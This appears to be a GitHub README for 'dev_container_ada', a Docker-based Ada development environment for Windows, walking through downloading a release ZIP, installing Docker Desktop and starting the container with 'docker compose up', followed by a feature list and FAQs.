# 🐍 dev_container_ada - Easy Ada Development Setup

[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/moaladelads/dev_container_ada/releases)

## 📝 About dev_container_ada

dev_container_ada is a ready-to-use development environment designed for Ada programming on Windows. It works with both desktop projects and embedded systems, especially ARM Cortex-M and Cortex-A devices. This container provides tools needed to build and test Ada applications without complicated setup.

This setup saves time by bundling all required tools in one package. You do not need to install Ada compilers, builders, or shell environments separately. Everything runs inside a containerized environment, keeping your Windows system clean.

The container supports many useful command-line tools like GNAT, GPRBuild, Docker, Podman, and Zsh shell. It works well with container platforms such as Kubernetes and nerdctl.

## 🌐 Access the Download Page

Click below to open the release page. Find the latest version and get the container files you need.

[![Download dev_container_ada](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/moaladelads/dev_container_ada/releases)

## 🖥 System Requirements

Before downloading, check these minimum requirements for your Windows PC:

- Windows 10 or later (64-bit)
- At least 8 GB RAM
- 4 GB free disk space  
- Internet connection to download files  
- Docker Desktop installed and running  
  (Docker Desktop for Windows is required to run containers)  

You can download Docker Desktop from [https://www.docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop).

## 🚀 Getting Started with dev_container_ada

Follow these steps to download, install, and run dev_container_ada on your Windows computer.

### 1. Visit the Release Page

Open this link in your web browser:  
https://github.com/moaladelads/dev_container_ada/releases

This page contains the latest releases of dev_container_ada. You will find files to download and instructions for use.

### 2. Download the Latest Release File

Look for the latest stable release. Files should be named with version numbers, such as `dev_container_ada-v1.0.zip` or similar. Click the file to download it to your PC.

Make note of the folder where you save the file so you can find it easily.

### 3. Install Docker Desktop on Windows

If you have not installed Docker Desktop, download it with this link:  
https://www.docker.com/products/docker-desktop

Run the installer and follow the setup guide. Docker lets you run containers like dev_container_ada.

After installation, start Docker Desktop. You should see the Docker icon in your system tray.

### 4. Extract dev_container_ada Files

Navigate to the folder where you saved the dev_container_ada release file.

Right-click the downloaded ZIP or compressed file and choose “Extract All…”  
Select a folder to extract to, such as `C:\dev_container_ada`.

After extraction, you will see several files, including configuration scripts and container images.

### 5. Open Windows PowerShell

Open the Start menu and type “PowerShell.” Select “Windows PowerShell” or “Windows Terminal.”

The command-line interface will let you run commands to launch dev_container_ada.

### 6. Launch the Container

Change the directory to the dev_container_ada folder by entering this command (replace the path if different):  
```powershell
cd C:\dev_container_ada
```

Run this command to start the development container:  
```powershell
docker compose up
```

This will start the container with all the Ada tools pre-installed. The process downloads or reuses the container image and sets up the environment.

### 7. Use the Development Environment

Once running, you have access to GNAT Ada compilers and build tools inside the container. Use the terminal to run Ada commands, build projects, or test embedded code.

To stop the container, press `Ctrl + C` in PowerShell and then run:  
```powershell
docker compose down
```

This shuts down the environment safely.

## 🔧 Features of dev_container_ada

- **GNAT Ada Compiler:** Compile Ada code with professional-grade tools.  
- **GPRBuild:** Build and manage Ada project files.  
- **Container Support:** Run and manage container environments using Docker, Podman, and nerdctl.  
- **Cross-Platform Embedded Support:** Build code for ARM Cortex-M and Cortex-A processors.  
- **Ubuntu-based Environment:** A stable Linux environment inside Windows for the best compatibility.  
- **Zsh Shell:** Use a more powerful and configurable shell experience.  
- **Kubernetes Ready:** Easily deploy Ada projects in Kubernetes managed containers.

## ❓ Common Questions

### Do I need to know Ada programming?

No. You can start by running the container without writing Ada code. The setup includes simple example projects and tutorials.

### Can I run this on older versions of Windows?

Windows 10 (64-bit) or newer is required because Docker Desktop needs these versions.

### What if Docker is not installed?

Install Docker Desktop before running the container. The container relies on Docker to work.

### How large is the download?

The container and files are usually around 1 to 2 GB. Make sure you have enough disk space and a steady internet connection.

### Can I update the container later?

Yes. Download newer releases from the same page and replace the old files. Then run `docker compose up` again.

---

## 📥 Download and Setup Links

Get the latest files here:  
[https://github.com/moaladelads/dev_container_ada/releases](https://github.com/moaladelads/dev_container_ada/releases)

Download Docker Desktop here (required):  
[https://www.docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop)

---

## ⚙️ Tips for Using the Environment

- Use PowerShell or Windows Terminal for better command handling.  
- Keep Docker Desktop running while working inside the container.  
- Explore example Ada code inside the `examples` folder after extraction.  
- Use `docker compose logs` to see container output and debug information.  
- Customize shell settings by editing `.zshrc` inside the container if you are familiar with Zsh.

---

## 📚 Learning More About Ada and Containers

If you want to learn Ada programming or container basics, consider visiting:

- Ada Language Guide by AdaCore: https://docs.adacore.com  
- Docker Documentation: https://docs.docker.com/get-started  

---

This setup lets you run a full Ada development environment on your Windows PC. It removes the hassle of manual installs and keeps your system organized.